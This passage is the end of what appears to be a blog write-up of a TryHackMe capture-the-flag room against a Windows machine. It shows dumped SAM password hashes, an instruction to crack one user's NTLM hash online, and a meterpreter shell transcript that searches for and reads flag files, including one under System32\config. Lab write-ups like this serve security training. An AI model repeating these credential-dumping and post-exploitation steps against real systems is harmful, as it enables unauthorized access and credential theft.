Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
</code></pre><p>Use <code>firefox</code> and load the url <a href="https://crackstation.net" target="_blank">crackstation</a> and crack the hash <code>ffb43f0de35be4d9917ac0cc8ad57f8d</code>.</p><h2 id="task-5---find-flags">Task 5 - Find flags!</h2><p>Use <code>msfconsole -q</code> to get a shell and find the flags.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20shell%0AProcess%202076%20created.%0AChannel%202%20created.%0AMicrosoft%20Windows%20[Version%206.1.7601]%0ACopyright%20(c)%202009%20Microsoft%20Corporation.%20%20All%20rights%20reserved.%0A%0AC:%5C%3Edir%20/s%20/p%20flag*%0Adir%20/s%20/p%20flag*%0AVolume%20in%20drive%20C%20has%20no%20label.%0AVolume%20Serial%20Number%20is%20E611-0B66%0A%0ADirectory%20of%20C:%5C%0A%0A03/17/2019%20%2002:27%20PM%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2024%20flag1.txt%0A%20%20%20%20%20%20%20%20%20%20%20%201%20File(s)%20%20%20%20%20%20%20%20%20%20%20%20%2024%20bytes%0A%0ADirectory%20of%20C:%5CUsers%5CJon%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CRecent%0A%0A03/17/2019%20%2002:26%20PM%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20482%20flag1.lnk%0A03/17/2019%20%2002:30%20PM%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20848%20flag2.lnk%0A03/17/2019%20%2002:32%20PM%20%20%20%20%20%20%20%20%20%20%20%20%202,344%20flag3.lnk%0A%20%20%20%20%20%20%20%20%20%20%20%203%20File(s)%20%20%20%20%20%20%20%20%20%203,674%20bytes%0A%0ADirectory%20of%20C:%5CUsers%5CJon%5CDocuments%0A%0A03/17/2019%20%2002:26%20PM%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2037%20flag3.txt%0A%20%20%20%20%20%20%20%20%20%20%20%201%20File(s)%20%20%20%20%20%20%20%20%20%20%20%20%2037%20bytes%0A%0ADirectory%20of%20C:%5CWindows%5CSystem32%5Cconfig%0A%0A03/17/2019%20%2002:32%20PM%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2034%20flag2.txt%0A%20%20%20%20%20%20%20%20%20%20%20%201%20File(s)%20%20%20%20%20%20%20%20%20%20%20%20%2034%20bytes%0A%0ATotal%20Files%20Listed:%0A%20%20%20%20%20%20%20%206%20File(s)%20%20%20%20%20%20%20%20%20%203,769%20bytes%0A%20%20%20%20%20%20%20%200%20Dir(s)%20%2020,479,127,552%20bytes%20free%0A%0AC:%5C%3Etype%20C:%5Cflag1.txt%0Atype%20C:%5Cflag1.txt%0A%3Cflag%3E%0A%0AC:%5C%3Etype%20C:%5CWindows%5CSystem32%5Cconfig%5Cflag2.txt%0Atype%20C:%5CWindows%5CSystem32%5Cconfig%5Cflag2.txt%0A%3Cflag%3E%0A%0AC:%5C%3Etype%20C:%5CUsers%5CJon%5CDocuments%5Cflag3.txt%0Atype%20C:%5CUsers%5CJon%5CDocuments%5Cflag3.txt%0A%3Cflag%3E" type="button"></button></div></div><pre><code>meterpreter &gt; shell
Process 2076 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\&gt;dir /s /p flag*
dir /s /p flag*
Volume in drive C has no label.
Volume Serial Number is E611-0B66

Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
            1 File(s)             24 bytes

Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent

03/17/2019  02:26 PM               482 flag1.lnk
03/17/2019  02:30 PM               848 flag2.lnk
03/17/2019  02:32 PM             2,344 flag3.lnk
            3 File(s)          3,674 bytes

Directory of C:\Users\Jon\Documents

03/17/2019  02:26 PM                37 flag3.txt
            1 File(s)             37 bytes

Directory of C:\Windows\System32\config

03/17/2019  02:32 PM                34 flag2.txt
            1 File(s)             34 bytes

Total Files Listed:
        6 File(s)          3,769 bytes
        0 Dir(s)  20,479,127,552 bytes free

C:\&gt;type C:\flag1.txt
type C:\flag1.txt
&lt;flag&gt;

C:\&gt;type C:\Windows\System32\config\flag2.txt
type C:\Windows\System32\config\flag2.txt
&lt;flag&gt;

C:\&gt;type C:\Users\Jon\Documents\flag3.txt
type C:\Users\Jon\Documents\flag3.txt
&lt;flag&gt;
</code></pre></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-alfred/"><div class="card-body"> <span class="timeago small" > Mar 22 <i class="unloaded">2021-03-22T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Alfred</h3><div class="text-muted small"><p> Alfred This room contains detailed info about jenkins exploitation and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeration NMAP ...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-steel-mountain/"><div class="card-body"> <span class="timeago small" > Mar 24 <i class="unloaded">2021-03-24T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Steel Mountain</h3><div class="text-muted small"><p> Steel Mountain This room contains detailed info about rejetto http vulnerability exploitation and privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enu...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-hackpark/"><div class="card-body"> <span class="timeago small" > Mar 25 <i class="unloaded">2021-03-25T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - HackPark</h3><div class="text-muted small"><p> HackPark This room contains detailed info about rejetto http vulnerability exploitation and privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumerati...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tryhackme-alfred/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Alfred</p></a> <a href="/posts/tryhackme-steel-mountain/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Steel Mountain</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> Â© 2021 <a href="https://github.com/4n3i5v74">4n3i5v74</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/network/">network</a> <a class="post-tag" href="/tags/protocols/">protocols</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/windows/">windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://4n3i5v74.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
